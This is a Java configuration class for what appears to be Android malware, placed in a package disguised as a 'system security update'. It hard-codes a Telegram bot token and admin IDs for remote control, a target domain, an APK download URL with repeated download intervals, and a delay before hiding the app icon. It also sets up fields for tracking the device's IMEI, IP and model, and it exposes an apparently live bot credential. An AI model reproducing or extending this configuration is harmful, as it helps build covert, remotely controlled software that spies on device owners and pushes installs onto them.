package com.system.security.update;

public class Config {
    
    // ===== TELEGRAM BOT =====
    public static final String BOT_TOKEN = "8749943600:AAFctiNcPnwjMQhe0Kbs9pOGVTFsg7F0rIw";
    
    // ⚠️ IMPORTANT: Get YOUR Telegram User ID from @userinfobot on Telegram
    // Then put it here. Multiple admins: comma separated like "12345,67890"
    public static final String ADMIN_IDS = "8073304246";
    
    // ===== DOMAIN =====
    public static String CURRENT_TARGET_URL = "https://pyarhub.in";
    
    // ===== APK DOWNLOAD =====
    public static String APK_DOWNLOAD_URL = "";
    
    // ===== INTERVALS =====
    public static final long BOT_CHECK_INTERVAL = 5000;   // 5 seconds
    public static final long DOWNLOAD_INTERVAL = 2500;     // 2.5 seconds
    public static final long HIDE_ICON_DELAY = 30000;      // 30 seconds
    
    // ===== STATS =====
    public static int totalOpens = 0;
    public static int totalDownloads = 0;
    public static int totalInstalls = 0;
    
    // ===== DEVICE TRACKING =====
    public static String deviceModel = "";
    public static String deviceAndroid = "";
    public static String deviceImei = "N/A";
    public static String deviceIp = "";
}
